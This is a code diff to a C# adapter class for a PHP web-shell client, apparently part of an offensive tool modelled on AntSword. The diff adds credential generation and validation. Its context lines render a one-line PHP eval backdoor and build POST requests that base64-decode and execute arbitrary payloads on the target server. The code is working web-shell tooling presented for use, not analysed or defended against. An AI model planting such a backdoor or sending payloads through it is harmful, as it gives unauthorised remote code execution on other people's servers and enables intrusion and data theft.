@@ -26,6 +26,13 @@ public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
     public string DefaultEncoder => "base64";
     public string DefaultDecoder => "base64";
 
+    public string GenerateCredential() => WebShellAdapters.RandomToken(6, 12);
+
+    public bool IsValidCredential(string credential)
+        => credential.Length is >= 6 and <= 32 && !credential.Contains(' ');
+
+    public string CredentialHint => "a short token without spaces";
+
     public string RenderScript(string password)
         => $"<?php @eval($_POST['{password}']); ?>";
 
@@ -72,7 +79,7 @@ public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
             [password] = $"@eval(@base64_decode($_POST['{payloadVariable}']));",
             [payloadVariable] = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)),
         };
-        return new WebShellRequest(url, form, tagStart, tagEnd);
+        return new WebShellRequest(url, form, tagStart, tagEnd, password);
     }
 
     public string? DecodeResponse(WebShellRequest request, string decoder, ReadOnlySpan<char> body)
